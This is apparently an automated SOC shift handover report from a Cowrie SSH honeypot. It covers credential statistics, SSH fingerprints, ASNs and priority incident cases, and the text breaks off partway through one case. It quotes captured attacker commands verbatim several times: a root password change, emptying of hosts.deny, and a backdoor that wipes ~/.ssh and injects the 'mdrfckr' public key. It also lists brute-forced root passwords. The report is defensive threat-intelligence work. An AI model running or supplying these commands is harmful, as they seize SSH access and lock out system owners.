# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-18 |
| **Generated At** | 2026-04-18T16:48:10Z |
| **Shift Time** | 16:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **133** |
| Confirmed Threats | **58** |
| False Positives Filtered | **75** (56.4%) |
| Unique Attacker IPs | **12** |
| Countries of Origin | **8** |
| High Severity Cases | **20** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **113** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **45** |
| Unique Credential Pairs | **29** |
| Unique Usernames | **18** |
| Unique Passwords | **27** |
| Successful Auth Pairs | **13** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 21 |
| `345gs5662d34` | 8 |
| `postgres` | 1 |
| `claude` | 1 |
| `yekta` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 10 |
| `345gs5662d34` | 8 |
| `123456` | 2 |
| `root` | 2 |
| `postgres1!` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 10 |
| `345gs5662d34` | `345gs5662d34` | 8 |
| `postgres` | `postgres1!` | 1 |
| `root` | `qqwweerr` | 1 |
| `claude` | `claude07` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `3245gs5662d34` | `165.154.149.253` | 2026-04-18T14:43:30 |
| `root` | `3245gs5662d34` | `154.202.119.248` | 2026-04-18T14:43:49 |
| `root` | `qqwweerr` | `183.110.116.87` | 2026-04-18T14:45:54 |
| `root` | `3245gs5662d34` | `183.110.116.87` | 2026-04-18T14:45:58 |
| `root` | `Server2026#` | `14.103.21.179` | 2026-04-18T14:48:05 |
| `root` | `qazwsxedc@#` | `183.110.116.87` | 2026-04-18T14:51:29 |
| `root` | `A12345678Z` | `165.154.149.253` | 2026-04-18T14:51:59 |
| `root` | `tq123456.` | `165.154.149.253` | 2026-04-18T14:53:43 |
| `root` | `A12345678A` | `165.154.149.253` | 2026-04-18T14:57:06 |
| `root` | `m123456` | `183.110.116.87` | 2026-04-18T14:57:08 |
| `root` | `xy@123456` | `165.154.149.253` | 2026-04-18T14:58:49 |
| `root` | `QAZwsx!@#123` | `165.154.149.253` | 2026-04-18T15:12:34 |
| `root` | `admin` | `213.112.126.159` | 2026-04-18T15:49:52 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **133** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 51 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 50 | 4 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |
| `f45fb203c310...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 50 | 4 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `f45fb203c310...` | libssh | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:IdcIw7ZYrTjx"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.21.179`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `165.154.149.253`, `183.110.116.87`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **12** |
| Unique ASNs | **11** |
| High-Risk ASNs | **7** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 2 | LOW |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS139549` | Crisp Enterprises | 1 | LOW |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | MEDIUM |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS8434` | Telenor Sverige AB | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (20)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1757886905df

| Field | Detail |
|---|---|
| **Source IP** | `165.154.149[.]253` |
| **First Seen** | 2026-04-18 14:43 |
| **Last Seen** | 2026-04-18 14:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:43:30` | `cowrie.session.connect` |
| `2026-04-18 14:43:30` | `cowrie.client.version` |
| `2026-04-18 14:43:30` | `cowrie.client.kex` |
| `2026-04-18 14:43:30` | `cowrie.login.success` |
| `2026-04-18 14:43:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.149[.]253` to AbuseIPDB if not already reported
- [ ] Block `165.154.149[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9c9297635c3

| Field | Detail |
|---|---|
| **Source IP** | `154.202.119[.]248` |
| **First Seen** | 2026-04-18 14:43 |
| **Last Seen** | 2026-04-18 14:43 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:43:39` | `cowrie.session.connect` |
| `2026-04-18 14:43:40` | `cowrie.client.version` |
| `2026-04-18 14:43:41` | `cowrie.client.kex` |
| `2026-04-18 14:43:49` | `cowrie.login.success` |
| `2026-04-18 14:43:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.202.119[.]248` to AbuseIPDB if not already reported
- [ ] Block `154.202.119[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-874142051a94

| Field | Detail |
|---|---|
| **Source IP** | `183.110.116[.]87` |
| **First Seen** | 2026-04-18 14:45 |
| **Last Seen** | 2026-04-18 14:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:45:53` | `cowrie.session.connect` |
| `2026-04-18 14:45:53` | `cowrie.client.version` |
| `2026-04-18 14:45:54` | `cowrie.client.kex` |
| `2026-04-18 14:45:54` | `cowrie.login.success` |
| `2026-04-18 14:45:54` | `cowrie.session.params` |
| `2026-04-18 14:45:54` | `cowrie.command.input` |
| `2026-04-18 14:45:54` | `cowrie.command.failed` |
| `2026-04-18 14:45:54` | `cowrie.log.closed` |
| `2026-04-18 14:45:55` | `cowrie.session.params` |
| `2026-04-18 14:45:55` | `cowrie.command.input` |
| `2026-04-18 14:45:55` | `cowrie.session.file_download` |
| `2026-04-18 14:45:55` | `cowrie.log.closed` |
| `2026-04-18 14:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.116[.]87` to AbuseIPDB if not already reported
- [ ] Block `183.110.116[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36efa44c9c2e

| Field | Detail |
|---|---|
| **Source IP** | `183.110.116[.]87` |
| **First Seen** | 2026-04-18 14:45 |
| **Last Seen** | 2026-04-18 14:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:45:57` | `cowrie.session.connect` |
| `2026-04-18 14:45:57` | `cowrie.client.version` |
| `2026-04-18 14:45:57` | `cowrie.client.kex` |
| `2026-04-18 14:45:58` | `cowrie.login.success` |
| `2026-04-18 14:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.116[.]87` to AbuseIPDB if not already reported
- [ ] Block `183.110.116[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba98a27b34c1

| Field | Detail |
|---|---|
| **Source IP** | `14.103.21[.]179` |
| **First Seen** | 2026-04-18 14:48 |
| **Last Seen** | 2026-04-18 14:48 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:IdcIw7ZYrTjx"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:48:03` | `cowrie.session.connect` |
| `2026-04-18 14:48:03` | `cowrie.client.version` |
| `2026-04-18 14:48:04` | `cowrie.client.kex` |
| `2026-04-18 14:48:05` | `cowrie.login.success` |
| `2026-04-18 14:48:06` | `cowrie.session.params` |
| `2026-04-18 14:48:06` | `cowrie.command.input` |
| `2026-04-18 14:48:06` | `cowrie.command.failed` |
| `2026-04-18 14:48:06` | `cowrie.log.closed` |
| `2026-04-18 14:48:06` | `cowrie.session.params` |
| `2026-04-18 14:48:06` | `cowrie.command.input` |
| `2026-04-18 14:48:06` | `cowrie.session.file_download` |
| `2026-04-18 14:48:06` | `cowrie.log.closed` |
| `2026-04-18 14:48:18` | `cowrie.session.params` |
| `2026-04-18 14:48:18` | `cowrie.command.input` |
| `2026-04-18 14:48:19` | `cowrie.log.closed` |
| `2026-04-18 14:48:19` | `cowrie.session.params` |
| `2026-04-18 14:48:19` | `cowrie.command.input` |
| `2026-04-18 14:48:19` | `cowrie.log.closed` |
| `2026-04-18 14:48:19` | `cowrie.session.params` |
| `2026-04-18 14:48:19` | `cowrie.command.input` |
| `2026-04-18 14:48:19` | `cowrie.session.file_download` |
| `2026-04-18 14:48:19` | `cowrie.log.closed` |
| `2026-04-18 14:48:20` | `cowrie.session.params` |
| `2026-04-18 14:48:20` | `cowrie.command.input` |
| `2026-04-18 14:48:20` | `cowrie.log.closed` |
| `2026-04-18 14:48:20` | `cowrie.session.params` |
| `2026-04-18 14:48:20` | `cowrie.command.input` |
| `2026-04-18 14:48:20` | `cowrie.log.closed` |
| `2026-04-18 14:48:21` | `cowrie.session.params` |
| `2026-04-18 14:48:21` | `cowrie.command.input` |
| `2026-04-18 14:48:21` | `cowrie.command.input` |
| `2026-04-18 14:48:21` | `cowrie.log.closed` |
| `2026-04-18 14:48:22` | `cowrie.session.params` |
| `2026-04-18 14:48:22` | `cowrie.command.input` |
| `2026-04-18 14:48:22` | `cowrie.log.closed` |
| `2026-04-18 14:48:23` | `cowrie.session.params` |
| `2026-04-18 14:48:23` | `cowrie.command.input` |
| `2026-04-18 14:48:23` | `cowrie.log.closed` |
| `2026-04-18 14:48:23` | `cowrie.session.params` |
| `2026-04-18 14:48:23` | `cowrie.command.input` |
| `2026-04-18 14:48:23` | `cowrie.log.closed` |
| `2026-04-18 14:48:24` | `cowrie.session.params` |
| `2026-04-18 14:48:24` | `cowrie.command.input` |
| `2026-04-18 14:48:24` | `cowrie.log.closed` |
| `2026-04-18 14:48:24` | `cowrie.session.params` |
| `2026-04-18 14:48:24` | `cowrie.command.input` |
| `2026-04-18 14:48:24` | `cowrie.log.closed` |
| `2026-04-18 14:48:24` | `cowrie.session.params` |
| `2026-04-18 14:48:24` | `cowrie.command.input` |
| `2026-04-18 14:48:25` | `cowrie.log.closed` |
| `2026-04-18 14:48:25` | `cowrie.session.params` |
| `2026-04-18 14:48:25` | `cowrie.command.input` |
| `2026-04-18 14:48:25` | `cowrie.log.closed` |
| `2026-04-18 14:48:26` | `cowrie.session.params` |
| `2026-04-18 14:48:26` | `cowrie.command.input` |
| `2026-04-18 14:48:26` | `cowrie.log.closed` |
| `2026-04-18 14:48:27` | `cowrie.session.params` |
| `2026-04-18 14:48:27` | `cowrie.command.input` |
| `2026-04-18 14:48:27` | `cowrie.log.closed` |
| `2026-04-18 14:48:28` | `cowrie.session.params` |
| `2026-04-18 14:48:28` | `cowrie.command.input` |
| `2026-04-18 14:48:28` | `cowrie.log.closed` |
| `2026-04-18 14:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.21[.]179` to AbuseIPDB if not already reported
- [ ] Block `14.103.21[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a12e15a60c6

| Field | Detail |
|---|---|
| **Source IP** | `183.110.116[.]87` |
| **First Seen** | 2026-04-18 14:51 |
| **Last Seen** | 2026-04-18 14:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:51:28` | `cowrie.session.connect` |
| `2026-04-18 14:51:28` | `cowrie.client.version` |
| `2026-04-18 14:51:28` | `cowrie.client.kex` |
| `2026-04-18 14:51:29` | `cowrie.login.success` |
| `2026-04-18 14:51:29` | `cowrie.session.params` |
| `2026-04-18 14:51:29` | `cowrie.command.input` |
| `2026-04-18 14:51:29` | `cowrie.command.failed` |
| `2026-04-18 14:51:29` | `cowrie.log.closed` |
| `2026-04-18 14:51:30` | `cowrie.session.params` |
| `2026-04-18 14:51:30` | `cowrie.command.input` |
| `2026-04-18 14:51:30` | `cowrie.session.file_download` |
| `2026-04-18 14:51:30` | `cowrie.log.closed` |
| `2026-04-18 14:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.116[.]87` to AbuseIPDB if not already reported
- [ ] Block `183.110.116[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d732613a1ff

| Field | Detail |
|---|---|
| **Source IP** | `183.110.116[.]87` |
| **First Seen** | 2026-04-18 14:51 |
| **Last Seen** | 2026-04-18 14:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:51:32` | `cowrie.session.connect` |
| `2026-04-18 14:51:32` | `cowrie.client.version` |
| `2026-04-18 14:51:32` | `cowrie.client.kex` |
| `2026-04-18 14:51:32` | `cowrie.login.success` |
| `2026-04-18 14:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.116[.]87` to AbuseIPDB if not already reported
- [ ] Block `183.110.116[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ca40ec83dd0

| Field | Detail |
|---|---|
| **Source IP** | `165.154.149[.]253` |
| **First Seen** | 2026-04-18 14:51 |
| **Last Seen** | 2026-04-18 14:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:51:59` | `cowrie.session.connect` |
| `2026-04-18 14:51:59` | `cowrie.client.version` |
| `2026-04-18 14:51:59` | `cowrie.client.kex` |
| `2026-04-18 14:51:59` | `cowrie.login.success` |
| `2026-04-18 14:51:59` | `cowrie.session.params` |
| `2026-04-18 14:51:59` | `cowrie.command.input` |
| `2026-04-18 14:52:00` | `cowrie.command.failed` |
| `2026-04-18 14:52:00` | `cowrie.log.closed` |
| `2026-04-18 14:52:00` | `cowrie.session.params` |
| `2026-04-18 14:52:00` | `cowrie.command.input` |
| `2026-04-18 14:52:00` | `cowrie.session.file_download` |
| `2026-04-18 14:52:00` | `cowrie.log.closed` |
| `2026-04-18 14:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.149[.]253` to AbuseIPDB if not already reported
- [ ] Block `165.154.149[.]253` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5564eb6c5612

| Field | Detail |
|---|---|
| **Source IP** | `165.154.149[.]253` |
| **First Seen** | 2026-04-18 14:52 |
| **Last Seen** | 2026-04-18 14:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:52:01` | `cowrie.session.connect` |
| `2026-04-18 14:52:01` | `cowrie.client.version` |
| `2026-04-18 14:52:01` | `cowrie.client.kex` |
| `2026-04-18 14:52:02` | `cowrie.login.success` |
| `2026-04-18 14:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.149[.]253` to AbuseIPDB if not already reported
- [ ] Block `165.154.149[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f7a6aa0ec08

| Field | Detail |
|---|---|
| **Source IP** | `165.154.149[.]253` |
| **First Seen** | 2026-04-18 14:53 |
| **Last Seen** | 2026-04-18 14:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:53:43` | `cowrie.session.connect` |
| `2026-04-18 14:53:43` | `cowrie.client.version` |
| `2026-04-18 14:53:43` | `cowrie.client.kex` |
| `2026-04-18 14:53:43` | `cowrie.login.success` |
| `2026-04-18 14:53:43` | `cowrie.session.params` |
| `2026-04-18 14:53:43` | `cowrie.command.input` |
| `2026-04-18 14:53:43` | `cowrie.command.failed` |
| `2026-04-18 14:53:43` | `cowrie.log.closed` |
| `2026-04-18 14:53:44` | `cowrie.session.params` |
| `2026-04-18 14:53:44` | `cowrie.command.input` |
| `2026-04-18 14:53:44` | `cowrie.session.file_download` |
| `2026-04-18 14:53:44` | `cowrie.log.closed` |
| `2026-04-18 14:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.149[.]253` to AbuseIPDB if not already reported
- [ ] Block `165.154.149[.]253` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee568a3c9a98

| Field | Detail |
|---|---|
| **Source IP** | `165.154.149[.]253` |
| **First Seen** | 2026-04-18 14:53 |
| **Last Seen** | 2026-04-18 14:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:53:45` | `cowrie.session.connect` |
| `2026-04-18 14:53:45` | `cowrie.client.version` |
| `2026-04-18 14:53:45` | `cowrie.client.kex` |
| `2026-04-18 14:53:46` | `cowrie.login.success` |
| `2026-04-18 14:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.149[.]253` to AbuseIPDB if not already reported
- [ ] Block `165.154.149[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8fb6edc9476

| Field | Detail |
|---|---|
| **Source IP** | `165.154.149[.]253` |
| **First Seen** | 2026-04-18 14:57 |
| **Last Seen** | 2026-04-18 14:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
